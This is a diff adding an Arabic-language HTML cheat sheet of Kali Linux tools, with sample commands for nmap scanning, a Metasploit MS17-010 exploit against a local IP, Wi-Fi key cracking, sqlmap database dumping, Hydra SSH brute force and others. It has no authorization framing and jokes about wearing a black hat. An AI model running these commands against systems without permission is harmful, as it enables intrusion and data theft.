@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>دليل أدوات Kali Linux</title>
+  <style>
+    body {
+      background-color: #121212;
+      color: #f0f0f0;
+      font-family: 'Segoe UI', sans-serif;
+      line-height: 1.8;
+      padding: 20px;
+    }
+    h1, h2 {
+      color: #00ffe0;
+    }
+    code {
+      background-color: #1e1e1e;
+      padding: 4px 8px;
+      border-radius: 4px;
+      display: block;
+      margin: 8px 0;
+      direction: ltr;
+    }
+    .tool {
+      border-bottom: 1px solid #333;
+      margin-bottom: 20px;
+      padding-bottom: 10px;
+    }
+  </style>
+</head>
+<body>
+  <h1>📘 دليل أدوات Kali Linux</h1>
+  <p>لا تنسَ الطقم الأسود 😉</p>
+
+  <div class="tool">
+    <h2>🔍 Nmap – فحص الشبكات</h2>
+    <p>يُستخدم لاكتشاف الأجهزة والمنافذ والخدمات على الشبكة.</p>
+    <code>nmap 192.168.1.1</code>
+    <code>nmap -sS 192.168.1.1</code>
+    <code>nmap -O 192.168.1.1</code>
+    <code>nmap -p 80,443 192.168.1.1</code>
+  </div>
+
+  <div class="tool">
+    <h2>🧨 Metasploit – استغلال الثغرات</h2>
+    <p>أداة قوية لتنفيذ هجمات على ثغرات أمنية معروفة.</p>
+    <code>msfconsole</code>
+    <code>search exploit</code>
+    <code>use exploit/windows/smb/ms17_010</code>
+    <code>set RHOST 192.168.1.5</code>
+    <code>exploit</code>
+  </div>
+
+  <div class="tool">
+    <h2>📡 Aircrack-ng – اختراق Wi-Fi</h2>
+    <p>للتقاط الحزم وكسر كلمات مرور الشبكات اللاسلكية.</p>
+    <code>airmon-ng start wlan0</code>
+    <code>airodump-ng wlan0mon</code>
+    <code>aircrack-ng -w wordlist.txt file.cap</code>
+  </div>
+
+  <div class="tool">
+    <h2>🕸️ SQLmap – حقن قواعد البيانات</h2>
+    <p>يكتشف وينفذ هجمات SQL Injection على تطبيقات الويب.</p>
+    <code>sqlmap -u "http://site.com/page.php?id=1" --dbs</code>
+    <code>sqlmap -u "..." --dump</code>
+  </div>
+
+  <div class="tool">
+    <h2>🔐 John the Ripper – كسر كلمات المرور</h2>
+    <p>يفك تشفير كلمات المرور باستخدام ملفات كلمات.</p>
+    <code>john --wordlist=rockyou.txt hash.txt</code>
+    <code>john --show hash.txt</code>
+  </div>
+
+  <div class="tool">
+    <h2>🌐 Burp Suite – اختبار تطبيقات الويب</h2>
+    <p>يعمل كوكيل لتحليل الطلبات والاستجابات بين المتصفح والخادم.</p>
+    <p>يُشغل من القائمة الرسومية ويُستخدم مع إعدادات البروكسي.</p>
+  </div>
+
+  <div class="tool">
+    <h2>🧠 Hydra – كسر كلمات المرور عبر الشبكة</h2>
+    <p>ينفذ هجمات brute-force على بروتوكولات مثل SSH وFTP.</p>
+    <code>hydra -l admin -P wordlist.txt ssh://192.168.1.5</code>
+  </div>
+
+  <div class="tool">
+    <h2>🕵️ theHarvester – جمع معلومات استخبارية</h2>
+    <p>يجمع بيانات عن نطاق معين مثل البريد الإلكتروني وIP.</p>
+    <code>theHarvester -d example.com -b google</code>
+  </div>
+
+  <div class="tool">
+    <h2>🧬 Maltego – تحليل العلاقات والروابط</h2>
+    <p>ينشئ خرائط بيانية للعلاقات بين الأشخاص والنطاقات.</p>
+    <p>يُشغل من القائمة الرسومية ويُستخدم عبر واجهة سحب وإفلات.</p>
+  </div>
+
+  <div class="tool">
+    <h2>🧪 Nikto – فحص أمان خوادم الويب</h2>
+    <p>يكتشف ثغرات في إعدادات السيرفرات.</p>
+    <code>nikto -h http://example.com</code>
+  </div>
+
+  <p>📌 تم إعداد هذا الدليل بواسطة Guokoni، المهندس المعماري التقني ومؤسس SahelMarket.</p>
+</body>
+</html>
